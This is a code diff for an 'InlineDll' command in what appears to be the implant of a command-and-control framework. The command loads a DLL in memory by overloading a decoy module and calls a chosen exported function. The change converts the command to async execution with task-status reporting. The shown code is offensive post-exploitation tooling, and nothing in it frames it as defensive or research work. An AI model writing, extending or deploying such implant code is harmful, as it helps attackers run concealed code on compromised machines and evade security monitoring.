@@ -7,6 +7,7 @@ using System.Security.Policy;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Extra;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -14,17 +15,19 @@ namespace Engineer.Commands
     {
         public override string Name => "InlineDll";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
                 if (task.File.Length < 1)
                 {
-                    return "Error: /dll argument not found, please include the path to the dll to load, it should be present on the ts";
+                    Tasking.FillTaskResults("Error: /dll argument not found, please include the path to the dll to load, it should be present on the ts",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
                 if (!task.Arguments.TryGetValue("/function", out string export))
                 {
-                    return "Error: /function argument not found, this is the exported function of the dll to call";
+                    Tasking.FillTaskResults("Error: /function argument not found, this is the exported function of the dll to call",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
                 task.Arguments.TryGetValue("/args", out string args);
                 args = args.TrimStart(' ');
@@ -39,7 +42,8 @@ namespace Engineer.Commands
 
                 if (string.IsNullOrWhiteSpace(decoy))
                 {
-                    return "Error: No suitable decoy found";
+                    Tasking.FillTaskResults("Error: No suitable decoy found",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
                 Console.WriteLine("found decoy trying to overload module");
                 // map the module
@@ -52,13 +56,13 @@ namespace Engineer.Commands
                 var result = (string)reprobate.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(WinApiDynamicDelegate.GenericDelegate), parameters);
 
                 // return output
-                return result;
+                Tasking.FillTaskResults(result,task,EngTaskStatus.Complete);
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
                 Console.WriteLine(ex.StackTrace);
-                return ex.Message;
+                Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed);
             }
         }
     }
